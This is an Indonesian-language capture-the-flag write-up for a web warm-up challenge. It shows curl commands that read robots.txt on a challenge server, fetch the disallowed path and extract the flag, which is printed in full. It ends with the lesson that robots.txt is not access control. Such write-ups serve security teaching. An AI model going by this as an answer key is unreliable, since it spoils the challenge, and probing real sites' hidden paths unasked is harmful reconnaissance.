---
ctf: "RIFFHACK 2026"
kategori: "Web"
challenge: "Robots.txt Courtesy"
flag: "bitflag{r0b0ts_4r3_n0t_4_s3cr3t_v4ult}"
teknik: "Entri Disallow: di robots.txt mengiklankan path tersembunyi"
---

# Robots.txt Courtesy — RIFFHACK 2026 (Web)

## Deskripsi Singkat

Pemanasan recon. Brief-nya menyebut "file kesopanan" dan "sembunyi dari mesin pencari" — keduanya memetakan langsung ke satu file di server web mana pun.

## Eksploitasi / Solusi

```bash
$ curl -s http://159.89.230.27/robots.txt
User-Agent: *
Allow: /
Disallow: /operator-cache-drop

$ curl -s http://159.89.230.27/operator-cache-drop | grep -oE 'bitflag\{[^}]+\}'
bitflag{r0b0ts_4r3_n0t_4_s3cr3t_v4ult}
```

Seluruh maksud `Disallow:` adalah memberi tahu crawler yang santun untuk tidak mengambil sebuah path; ia dikirim tanpa autentikasi, dalam cleartext, ke siapa pun yang meminta. Path di `Disallow:` secara fungsional adalah undangan berpapan-nama.

## Catatan / Insight

Pelajarannya (dan payload flag-nya): file kesopanan bukan kontrol akses. Kalau sebuah halaman tidak seharusnya dijangkau tanpa otorisasi, pasang pengecekan otorisasi sungguhan di sana. `robots.txt` dan `noindex` adalah petunjuk untuk mesin pencari, dan mesin pencari bukan satu-satunya klien.

## Flag

```
bitflag{r0b0ts_4r3_n0t_4_s3cr3t_v4ult}
```
